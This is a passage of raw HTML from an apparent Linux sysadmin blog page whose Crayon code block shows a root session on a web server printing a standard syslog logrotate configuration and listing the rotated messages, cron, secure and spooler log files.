Jan  8 03:36 /var/log/messages-20170108\r\n-rw------- 1 root root 51843025 Jan 15 03:40 /var/log/messages-20170115\r\n[root@huanqiu_web1 ~]# ll /var/log/cron*\r\n-rw------- 1 root root 2155681 Jan 19 18:43 /var/log/cron\r\n-rw------- 1 root root 2932618 Dec 25 03:11 /var/log/cron-20161225\r\n-rw------- 1 root root 2939305 Jan  1 03:06 /var/log/cron-20170101\r\n-rw------- 1 root root 2951820 Jan  8 03:37 /var/log/cron-20170108\r\n-rw------- 1 root root 3203992 Jan 15 03:41 /var/log/cron-20170115\r\n[root@huanqiu_web1 ~]# ll /var/log/secure*\r\n-rw------- 1 root root  275343 Jan 19 18:36 /var/log/secure\r\n-rw------- 1 root root 2111936 Dec 25 03:06 /var/log/secure-20161225\r\n-rw------- 1 root root 2772744 Jan  1 02:57 /var/log/secure-20170101\r\n-rw------- 1 root root 1115543 Jan  8 03:26 /var/log/secure-20170108\r\n-rw------- 1 root root  731599 Jan 15 03:40 /var/log/secure-20170115\r\n[root@huanqiu_web1 ~]# ll /var/log/spooler*\r\n-rw------- 1 root root 0 Jan 15 03:41 /var/log/spooler\r\n-rw------- 1 root root 0 Dec 18 03:21 /var/log/spooler-20161225\r\n-rw------- 1 root root 0 Dec 25 03:11 /var/log/spooler-20170101\r\n-rw------- 1 root root 0 Jan  1 03:06 /var/log/spooler-20170108\r\n-rw------- 1 root root 0 Jan  8 03:37 /var/log/spooler-20170115</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba9152896608-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba9152896608-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba9152896608-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba9152896608-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba9152896608-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba9152896608-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba9152896608-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba9152896608-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba9152896608-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba9152896608-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba9152896608-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba9152896608-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba9152896608-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba9152896608-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba9152896608-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba9152896608-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba9152896608-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba9152896608-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba9152896608-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba9152896608-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba9152896608-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba9152896608-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba9152896608-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba9152896608-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba9152896608-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba9152896608-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba9152896608-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba9152896608-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba9152896608-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba9152896608-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba9152896608-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba9152896608-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba9152896608-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba9152896608-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba9152896608-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba9152896608-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba9152896608-37\">37</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd56e45ba9152896608-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">huanqiu_web1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># cat /etc/logrotate.d/syslog </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba9152896608-2\"><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">log</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">cron</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45ba9152896608-3\"><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">log</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">maillog</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba9152896608-4\"><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">log</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">messages</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45ba9152896608-5\"><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">log</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">secure</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba9152896608-6\"><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">log</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">spooler</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45ba9152896608-7\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba9152896608-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">sharedscripts</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45ba9152896608-9\"><span class=\"crayon-e\">    </span><span class=\"crayon-v\">postrotate</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba9152896608-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">kill</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">HUP</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">cat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">run</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">syslogd</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">pid</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dev</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">null</span><span class=\"crayon-sy\">`</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dev</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">null</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">||</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45ba9152896608-11\"><span class=\"crayon-h\">    </span><span class=\"crayon-i\">endscript</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba9152896608-12\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45ba9152896608-13\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba9152896608-14\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">huanqiu_web1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># ll /var/log/messages*</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45ba9152896608-15\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">root </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">34248975</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Jan</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">19</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">42</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">messages</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba9152896608-16\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">root </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">51772994</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Dec</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">25</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">03</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">11</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">messages</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">20161225</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45ba9152896608-17\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">root </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">51800210</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Jan</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">03</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">05</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">messages</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">20170101</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba9152896608-18\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">root </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">51981366</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Jan</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">8</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">03</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">36</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">messages</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">20170108</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45ba9152896608-19\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">root </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">51843025</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Jan</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">15</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">03</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">40</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">messages</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">20170115</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba9152896608-20\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">huanqiu_web1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># ll /var/log/cron*</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45ba9152896608-21\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">root </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2155681</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Jan</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">19</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">43</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">cron</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba9152896608-22\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">root </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2932618</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Dec</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">25</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">03</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">11</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">cron</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">20161225</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45ba9152896608-23\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">root </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2939305</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Jan</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">03</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">06</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">cron</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">20170101</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba9152896608-24\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">root </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2951820</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Jan</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">8</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">03</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">37</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">cron</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">20170108</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45ba9152896608-25\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">root </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3203992</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Jan</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">15</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">03</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">41</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">cron</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">20170115</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba9152896608-26\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">huanqiu_web1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># ll /var/log/secure*</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45ba9152896608-27\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">root </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">275343</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Jan</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">19</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">36</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">secure</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba9152896608-28\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">root </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2111936</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Dec</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">25</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">03</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">06</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">secure</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">20161225</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45ba9152896608-29\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">root </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2772744</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Jan</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">02</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">57</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">secure</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">20170101</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba9152896608-30\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">root </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1115543</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Jan</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">8</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">03</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">26</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">secure</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">20170108</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45ba9152896608-31\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">root </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">731599</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Jan</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">15</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">03</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">40</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">secure</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">20170115</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba9152896608-32\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">huanqiu_web1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># ll /var/log/spooler*</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45ba9152896608-33\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">root </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Jan</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">15</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">03</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">41</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">spooler</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba9152896608-34\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">root </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Dec</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">03</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">21</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">spooler</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">20161225</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45ba9152896608-35\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">root </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Dec</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">25</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">03</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">11</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">/</span><span 